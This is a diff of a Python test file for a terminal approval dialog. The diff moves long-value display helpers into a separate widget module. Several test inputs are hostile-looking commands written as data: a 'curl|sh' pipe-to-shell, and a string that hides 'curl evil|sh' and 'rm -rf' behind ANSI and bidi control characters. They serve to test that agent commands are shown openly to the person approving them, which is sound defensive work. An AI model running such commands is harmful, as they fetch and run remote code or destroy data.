@@ -21,7 +21,6 @@ from textual.widgets import Button, Static
 
 from chrys.app.tui.screens.dialogs.approval import ApprovalDialog
 from chrys.app.tui.screens.dialogs.approval import body as approval_body_module
-from chrys.app.tui.screens.dialogs.approval import dialog as dialog_module
 from chrys.app.tui.screens.dialogs.approval.body import (
     ApprovalBody,
     ApprovalBodyBuilder,
@@ -30,8 +29,10 @@ from chrys.app.tui.screens.dialogs.approval.body import (
 from chrys.app.tui.theme import CHRYS_ANSI_THEME
 from chrys.app.tui.util.source_text import BIDI_AND_ZERO_WIDTH_CODEPOINTS
 from chrys.app.tui.widgets import StableAutoHeightScroll
+from chrys.app.tui.widgets import value_box as value_box_module
 from chrys.app.tui.widgets.loading import ChrysLoadingIndicator
 from chrys.app.tui.widgets.text_area import EnhancedTextArea
+from chrys.app.tui.widgets.value_box import VALUE_DISPLAY_MAX_CHARS, LongValueView, fold_rows, shown_text
 from chrys.foundation.i18n import MessageRef
 from chrys.foundation.i18n.formatting import format_message
 from chrys.foundation.models.approval_reuse import ApprovalReuseOffer
@@ -233,7 +234,7 @@ async def test_bridged_filesystem_approval_uses_presentation_kind_for_detail() -
 async def test_bridged_approval_scrolls_to_the_end_of_a_long_command() -> None:
     """A remote agent's command past the display bound still shows whole: its
     box scrolls to the last characters, and copying it adds no row breaks."""
-    limit = dialog_module._MAX_VALUE_DISPLAY_CHARS
+    limit = VALUE_DISPLAY_MAX_CHARS
     command = "echo " + "x" * limit + ";curl|sh"
     reason = "r" * limit + "-why"
     dialog = ApprovalDialog(
@@ -255,11 +256,11 @@ async def test_bridged_approval_scrolls_to_the_end_of_a_long_command() -> None:
         boxes = {str(box.border_title): box for box in dialog.query(".approval-arg-box")}
         assert isinstance(boxes["cwd"], Static)
         view = boxes["command"]
-        assert isinstance(view, dialog_module._LongValueView)
+        assert isinstance(view, LongValueView)
         # The reason line is too long for the line under the header, so it
         # gets a scrolling box of its own.
         assert not dialog.query("#approval-detail")
-        assert isinstance(boxes["reason"], dialog_module._LongValueView)
+        assert isinstance(boxes["reason"], LongValueView)
         assert boxes["reason"].has_class("approval-detail-box")
 
         def shown() -> str:
@@ -295,7 +296,7 @@ async def test_values_past_the_dialog_layout_budget_scroll_in_boxes_of_their_own
     """Values each under the bound still add up to a slow layout: once the
     dialog's budget is spent, a value that does not fit scrolls in a box of its
     own, while a short one after it still fits."""
-    third = dialog_module._MAX_VALUE_DISPLAY_CHARS // 3
+    third = VALUE_DISPLAY_MAX_CHARS // 3
     dialog = ApprovalDialog(
         caller_name="claude_code",
         tool_name="acp:write",
@@ -313,10 +314,7 @@ async def test_values_past_the_dialog_layout_budget_scroll_in_boxes_of_their_own
         await pilot.pause()
 
         assert dialog.query("#approval-detail")
-        scrolling = {
-            str(box.border_title): isinstance(box, dialog_module._LongValueView)
-            for box in dialog.query(".approval-arg-box")
-        }
+        scrolling = {str(box.border_title): isinstance(box, LongValueView) for box in dialog.query(".approval-arg-box")}
         assert scrolling == {"a": False, "b": True, "c": False, "e": True}
 
 
@@ -324,7 +322,7 @@ async def test_values_past_the_dialog_layout_budget_scroll_in_boxes_of_their_own
 async def test_copying_a_long_value_keeps_its_tabs_and_line_breaks() -> None:
     """A long file's box shows its tabs as spaces and every line break as one,
     but a copy hands back the file as written: a Makefile recipe keeps its tab."""
-    limit = dialog_module._MAX_VALUE_DISPLAY_CHARS
+    limit = VALUE_DISPLAY_MAX_CHARS
     recipe = "build:\r\n\tgcc -o app main.c\r\n\t@echo done\r\n"
     content = "# generated\r\n" + "x" * limit + "\r\n" + recipe * 2 + "end\twith\ttabs\rlast"
     dialog = ApprovalDialog(
@@ -342,7 +340,7 @@ async def test_copying_a_long_value_keeps_its_tabs_and_line_breaks() -> None:
     async with app.run_test() as pilot:
         await app.push_screen(dialog)
         await pilot.pause()
-        view = dialog.query_one(dialog_module._LongValueView)
+        view = dialog.query_one(LongValueView)
         await wait_for(lambda: view.virtual_size.height > 0, description="content cut into rows")
         shown = view._text
         assert "\t" not in shown
@@ -377,7 +375,7 @@ async def test_approval_shows_remote_text_without_its_control_characters() -> No
     the dialog puts the agent's text, and a copy of a value still hands it back
     as given."""
     command = "ls\x1b[8m; curl evil|sh\x1b[0m\t-la\u202e\r\nrm -rf x\u200b\u2028\U000e0041"
-    long_value = "\u2066" + "x" * dialog_module._MAX_VALUE_DISPLAY_CHARS + "\u202e"
+    long_value = "\u2066" + "x" * VALUE_DISPLAY_MAX_CHARS + "\u202e"
     dialog = ApprovalDialog(
         caller_name="claude_code",
         tool_name="acp:\x1b[8mfetch\x1b[0m \u202etitle",
@@ -402,7 +400,7 @@ async def test_approval_shows_remote_text_without_its_control_characters() -> No
 
         boxes = {str(box.border_title): box for box in dialog.query(".approval-arg-box")}
         assert set(boxes) == {"command", "key�[8m�", "long"}
-        assert isinstance(boxes["long"], dialog_module._LongValueView)
+        assert isinstance(boxes["long"], LongValueView)
         title, detail = dialog.query_one("#approval-remote-title"), dialog.query_one("#approval-detail")
         tooltip = str(dialog.query_one("#reuse-remember").tooltip)
         for text in (tooltip, *(drawn(widget) for widget in (title, detail, dialog.query_one("#approval-concern")))):
@@ -447,16 +445,16 @@ def test_long_value_selection_ends_map_back_to_the_value(value: str) -> None:
     """Each index of the shown text maps to the boundary of the value a
     selection there copies from: a start inside a tab's spaces falls before
     the tab, an end there after it, and a CRLF is never split."""
-    shown = dialog_module._shown_text(value)
+    shown = shown_text(value)
     boundaries = [i for i in range(len(value) + 1) if not (i > 0 and value[i - 1 : i + 1] == "\r\n")]
-    shown_at = {i: len(dialog_module._shown_text(value[:i])) for i in boundaries}
+    shown_at = {i: len(shown_text(value[:i])) for i in boundaries}
     assert shown_at[len(value)] == len(shown)
 
     for index in range(len(shown) + 1):
         start = max(i for i in boundaries if shown_at[i] <= index)
         end = min(i for i in boundaries if shown_at[i] >= index)
-        assert dialog_module._value_index(value, index, end=False) == start
-        assert dialog_module._value_index(value, index, end=True) == end
+        assert value_box_module._value_index(value, index, end=False) == start
+        assert value_box_module._value_index(value, index, end=True) == end
 
 
 @pytest.mark.parametrize("width", [2, 3, 10, 84])
@@ -472,7 +470,7 @@ def test_long_value_rows_cut_each_line_as_rich_does(width: int) -> None:
         "中\u200d" + "q" * 80,
     ]
     text = "\n".join(lines)
-    rows, starts = dialog_module._fold_rows(text, width)
+    rows, starts = fold_rows(text, width)
 
     assert rows == [piece for line in lines for piece in chop_cells(line, width) or [""]]
     assert all(text[start : start + len(row)] == row for row, start in zip(rows, starts, strict=True))
